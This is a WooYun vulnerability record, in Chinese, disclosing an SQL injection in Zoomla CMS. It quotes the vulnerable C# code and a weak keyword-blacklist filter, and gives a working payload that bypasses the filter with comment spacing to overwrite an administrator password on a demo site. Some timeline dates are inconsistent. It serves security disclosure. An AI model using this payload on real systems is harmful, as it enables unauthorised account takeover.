{"id": 8103, "wybug_id": "wooyun-2013-040915", "wybug_title": "逐浪CMS通用型SQL注入3", "wybug_corp": "逐浪CMS", "wybug_author": "wefgod", "wybug_date": "2013-11-19 02:40", "wybug_open_date": "2013-11-24 02:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t1970-01-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t1970-02-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t1970-03-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t1970-03-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向公众公开  简要描述： 绕过了那个很简单的防注入。直接可以update管理员密码。 详细说明：  没什么太多可说的……就注入。   漏洞证明：  注入点：http://demo.zoomla.cn/user/cashcoupon/arrivejihuo.aspx页面的按钮点击事件：\nprotected void Btn_Click调用了b_Arrive.UpdateState(text);public bool UpdateState(string ArriveNo){\tstring sqlStr = \"Update ZL_Arrive SET State =1 WHERE ArriveNO='\" + ArriveNo + \"'\";  ///果断注入\treturn SqlHelper.ExecuteSql(sqlStr);}\nPage_Load方法里面有调用到了一个函数：DataSecurity.StartProcessRequest();上面这个函数具体是这样的：\npublic static void StartProcessRequest(){\ttry\t{\t\tif (HttpContext.Current.Request.QueryString != null)\t\t{\t\t\tfor (int i = 0; i < HttpContext.Current.Request.QueryString.Count; i++)\t\t\t{\t\t\t\tstring getkeys = HttpContext.Current.Request.QueryString.Keys[i];\t\t\t\tif (!DataSecurity.ProcessSqlStr(HttpContext.Current.Request.QueryString[getkeys]))\t\t\t\t{\t\t\t\t\tfunction.WriteErrMsg(\"数据不能包含SQL注入代码!\");\t\t\t\t\tHttpContext.Current.Response.End();\t\t\t\t}\t\t\t}\t\t}\t\tif (HttpContext.Current.Request.Form != null)\t\t{\t\t\tfor (int j = 0; j < HttpContext.Current.Request.Form.Count; j++)\t\t\t{\t\t\t\tstring getkeys = HttpContext.Current.Request.Form.Keys[j];\t\t\t\tif (!DataSecurity.ProcessSqlStr(HttpContext.Current.Request.Form[getkeys]))\t\t\t\t{\t\t\t\t\tfunction.WriteErrMsg(\"数据不能包含SQL注入代码!\");\t\t\t\t\tHttpContext.Current.Response.End();\t\t\t\t}\t\t\t}\t\t}\t}\t……}\n里面还调用到一个DataSecurity.ProcessSqlStr\npublic static bool ProcessSqlStr(string Str){\tbool ReturnValue = true;\tStr = Str.ToLower();\ttry\t{\t\tif (Str != \"\")\t\t{\t\t\tstring SqlStr = \"and |exec |insert |select |delete |update |count |chr |mid |master |truncate |char |declare \";\t\t\tstring[] anySqlStr = SqlStr.Split(new char[]\t\t\t{\t\t\t\t'|'\t\t\t});\t\t\tstring[] array = anySqlStr;\t\t\tfor (int i = 0; i < array.Length; i++)\t\t\t{\t\t\t\tstring ss = array[i];\t\t\t\tif (Str.IndexOf(ss) >= 0)\t\t\t\t{\t\t\t\t\tReturnValue = false;\t\t\t\t}\t\t\t}\t\t}\t}\tcatch\t{\t\tReturnValue = false;\t}\treturn ReturnValue;}\n对于变量string SqlStr = \"and |exec |insert |select |delete |update |count |chr |mid |master |truncate |char |declare \";里面的特征字符串，仅仅是做了一个很简单的匹配，很容易绕过，看例子：在页面正常输入东西：\n\n提交的时候截断一下，改下优惠券编号的代码，如下：1';update/**/zl_manager set adminpassword='c4ca4238a0b923820dcc509a6f75849b' where adminname='testuser'--执行前管理密码是这样的：\n\n执行后是这样的：\n\n表明注入成功。   修复方案：  过滤，参数化查询。   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-24 02:40 厂商回复：  漏洞Rank：10  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-25 07:45 |    \t\t雷锋小号 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云现在就缺我这种默默顶贴从来不求脸熟的...)\t\t \n  这种网站没多大意义    \n     2013-10-25 09:08 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @雷锋小号 确实没多大意义。他是一套CMS而已。就做目标站的旁站来说，遇到他我会很高兴    \n     2013-10-30 14:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @逐浪CMS     \n     2013-11-06 16:26 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗  狗哥，邮件发过去似乎木有人帮忙关联下啊    \n     2013-11-06 17:15 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 改了    \n     2013-11-06 17:36 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 谢谢狗哥，让您费心了！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}